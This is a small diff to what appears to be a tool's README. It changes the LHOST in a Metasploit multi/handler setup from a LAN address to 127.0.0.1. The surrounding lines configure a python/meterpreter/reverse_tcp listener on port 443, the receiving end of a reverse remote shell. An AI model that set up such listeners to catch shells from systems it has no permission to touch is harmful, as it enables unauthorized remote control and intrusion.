@@ -238,7 +238,7 @@ Note: You can also use our custom icons from the icon folder, just use them like
 $ sudo msfconsole
 msf3> use exploit/multi/handler
 msf3> set payload python/meterpreter/reverse_tcp
-msf3> set LHOST 192.168.43.221
+msf3> set LHOST 127.0.0.1
 msf3> set LPORT 443
 msf3> run
 ```
